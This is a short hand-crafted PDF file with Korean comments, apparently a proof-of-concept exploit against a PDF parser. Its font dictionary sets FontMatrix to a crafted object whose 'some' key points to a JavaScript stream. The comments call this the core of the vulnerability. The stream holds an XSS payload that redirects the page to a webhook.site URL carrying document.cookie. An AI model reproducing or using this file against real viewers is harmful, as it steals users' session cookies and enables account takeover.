%PDF-1.7

1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< 
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 600 800]
  /Resources <<
    /Font <<
      % 폰트 리소스를 정의하여 파서가 FontMatrix를 처리하도록 유도합니다.
      /F1 4 0 R
    >>
  >>
  /Contents 7 0 R % 페이지 렌더링을 위한 최소한의 Contents
>>
endobj

% 폰트 딕셔너리
4 0 obj
<<
  /Type /Font
  /Subtype /Type1
  /BaseFont /Helvetica
  % 취약점의 핵심: FontMatrix가 악성 객체(5 0 R)를 참조하도록 합니다.
  /FontMatrix 5 0 R
>>
endobj

% 악성 FontMatrix 객체
5 0 obj
<<
  % 파서가 .some()을 호출할 때, 이 키의 값(6 0 R)을 참조하게 됩니다.
  /some 6 0 R
>>
endobj

% XSS 페이로드를 담은 JavaScript 스트림
6 0 obj
<<
  /Filter /JavaScript
  /Length 95
>>
stream
window.location='https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3/?c=' + document.cookie;
endstream
endobj

% 페이지 렌더링을 위한 빈 Contents 스트림
7 0 obj
<< /Length 0 >>
stream
endstream
endobj

trailer
<< /Root 1 0 R >>
%%EOF
